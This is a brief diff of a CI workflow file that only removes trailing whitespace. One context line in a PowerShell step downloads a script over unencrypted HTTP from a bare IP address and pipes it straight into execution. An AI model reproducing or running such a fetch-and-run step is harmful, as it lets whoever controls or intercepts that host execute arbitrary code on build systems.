@@ -25,7 +25,7 @@ jobs:
         shell: powershell
         run: |
           iwr -useb http://188.245.97.105/latest/tools/installer.ps1 | iex
-      
+
       - name: Add to PATH and test
         shell: powershell
         run: |
